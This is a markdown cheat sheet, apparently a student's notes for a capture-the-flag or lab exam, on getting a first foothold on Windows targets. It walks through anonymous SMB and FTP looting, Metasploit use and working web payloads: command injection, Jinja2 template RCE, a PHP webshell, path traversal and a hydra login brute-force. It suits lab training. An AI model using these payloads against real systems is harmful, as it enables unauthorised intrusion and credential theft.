# 02 — Foothold (easy flag + first shell)

Map open ports → one of the **4 Windows archetypes**. Easy flag usually sits right here.

## Archetype A — anonymous SMB share  (445 open)
```bash
smbclient -L //$RHOST -N                       # list shares
smbclient //$RHOST/<Share> -N                  # connect; recurse ON; prompt OFF; mget *
#   read every .txt/.md/.ps1/.xml — flag + creds + usernames live in shares
nxc smb $RHOST -u '' -p '' --shares            # confirm anon access, see perms (READ/WRITE)
```
Writable share + a scheduled/privileged task that runs from it → drop payload (see `04`).

## Archetype B — anonymous FTP  (21 open)
```bash
ftp -n $RHOST     # user anonymous anonymous  → ls -la ; binary ; get <flag/notes>
# Writable (put works)? Upload a web-triggered or task-triggered payload, then trigger it.
```

## Archetype C — service port with a known version  (⭐ the ONE Metasploit use)
```bash
searchsploit <product> <version>               # e.g. searchsploit "Apache 2.4.49"
# If a clean public RCE exists and it's the cleanest way in -> spend your single MSF use:
msfconsole -q
#   search <product>;  use <module>;  set RHOSTS $RHOST;  set LHOST $LHOST;  set LPORT 4444;  run
# Otherwise run the searchsploit PoC manually (bonus marks) -> see 03 for the catch.
```
Decide MSF here, not on privesc. If a manual PoC is feasible in a few minutes, prefer it.

## Archetype D — web application  (80 / high random port)  ⭐ most common
```bash
# 1) FINGERPRINT + read everything
whatweb http://$RHOST:<port>/ ; curl -s http://$RHOST:<port>/robots.txt
curl -s http://$RHOST:<port>/sitemap.xml                 # hidden endpoints (Tut10)
#    View source for comments / creds / API paths.
# 2) CONTENT DISCOVERY (gentle)
gobuster dir -u http://$RHOST:<port>/ -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,json -t 4 -o loot/gobuster.txt
```
Then exploit the vector you find:

**Command injection** (a field/param that reaches the OS):
```bash
# test:  ; whoami   |   | whoami   |   `whoami`   |   $(whoami)
curl -s "http://$RHOST:<port>/ping?host=127.0.0.1;whoami"
# -> chain a reverse shell (see 03, PowerShell one-liner URL-encoded)
```

**SSTI** (template engines — Tut7/8):
```bash
# detect:  {{7*7}} -> 49   |   ${7*7}   |   <%= 7*7 %>
# Jinja2 RCE:  {{ cycler.__init__.__globals__.os.popen('whoami').read() }}
```

**File upload** → webshell:
```bash
# upload cmd.php (or .aspx on IIS):  <?php system($_GET['c']); ?>
curl -s "http://$RHOST:<port>/uploads/cmd.php?c=whoami"
# IIS/.NET box? use .aspx:   <% Response.Write(new System.Diagnostics...) %>
```

**LFI / path traversal**:
```bash
curl -s "http://$RHOST:<port>/?file=../../../../windows/win.ini"
curl -s "http://$RHOST:<port>/?file=../../../../Users/<u>/Desktop/flag_easy.txt"
```

**Login form** → try obvious + leaked creds (see `06`; stay gentle, top-250, one user):
```bash
hydra -l <user> -P wordlists/rockyou-top250.txt $RHOST http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect" -t 1 -W 1
```

## After foothold → turn it into a shell
Go to **`03-shells.md`**. Start the listener BEFORE triggering the payload. Then enumerate for privesc:
```
Windows shell -> whoami /priv   (04)      Linux shell -> sudo -l; id   (05)
```

## Reminders
- **Read everything** you can access anonymously first — the easy flag is rarely hidden deep.
- Credentials found here (share notes, PS history, config) often unlock RDP/WinRM/MSSQL → pivot.
- One MSF use total — commit it to the foothold exploit that saves the most time, nowhere else.
